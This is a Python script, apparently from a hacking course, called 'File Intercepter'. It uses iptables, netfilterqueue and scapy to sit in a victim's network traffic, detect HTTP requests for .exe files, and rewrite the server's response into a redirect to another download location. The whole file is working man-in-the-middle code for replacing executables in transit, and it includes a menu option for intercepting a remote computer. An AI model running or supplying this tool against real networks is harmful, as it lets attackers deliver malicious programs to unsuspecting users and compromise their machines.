import netfilterqueue
import subprocess
import scapy.all as scapy
import sys

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

queue = netfilterqueue.NetfilterQueue()

ack_list = []

def set_load(scapy_packet, load):
    scapy_packet[scapy.TCP].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] This is a request.")
            print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load.decode(errors="ignore"):
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("exe request")
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[-] Replacing file")
                load = ("HTTP/1.1 301 Moved Permanently\r\n" 
                        "Location: http://example.com/index.asp\r\n\r\n")

                modified = set_load(scapy_packet, load)      
                packet.set_payload(bytes(modified))
        
    packet.accept()

def execute_intercepting():
    queue.bind(0,process_packet)
    queue.run()

def main():
    print(f"{CYAN}[+] Welcome to File Intercepter.{RESET}")
    print("[+] How would you like to run the File Intercepter?")
    print("\t[1] Remote Computer")
    print("\t[2] My Computer")
    print("\t[00] Exit")
    choice = str(input(f"{CYAN}[!] Enter the number > {RESET}"))
    try:
        if choice == "1":
            print(f"[+] Setting up iptables for remote computer")
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
            print(f"{GREEN}[+] File Intercepting started.{RESET}")
            execute_intercepting()
        elif choice == "2":
            print("[+] Setting up iptables for personal computer")
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
            print(f"{GREEN}[+] File Intercepting started.{RESET}")
            execute_intercepting()
        elif choice == "00":
            sys.exit()
    except KeyboardInterrupt:
        print(f"\r{RED}[!] CTRL + C detected. Exiting program...{RESET}")  
        subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-D", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        print(f"{GREEN}[+] Clearing iptables{RESET}")

if __name__ == "__main__":
    main()